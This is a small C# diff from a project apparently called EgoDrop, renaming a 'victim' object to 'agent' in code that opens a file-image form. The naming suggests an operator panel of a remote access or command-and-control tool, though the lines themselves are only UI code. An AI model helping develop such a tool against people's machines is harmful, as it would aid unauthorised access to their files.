@@ -748,10 +748,10 @@ namespace EgoDrop
                 .Select(x => x.szFilePath)
                 .ToList();
 
-            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim, m_szVictimID);
+            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_agent);
             if (f == null)
             {
-                f = new frmFileImage(m_victim);
+                f = new frmFileImage(m_agent);
                 f.Show();
             }
             else
@@ -770,10 +770,10 @@ namespace EgoDrop
                 .Select(x => x.szFilePath)
                 .ToList();
 
-            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim, m_szVictimID);
+            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_agent);
             if (f == null)
             {
-                f = new frmFileImage(m_victim);
+                f = new frmFileImage(m_agent);
                 f.Show();
             }
             else
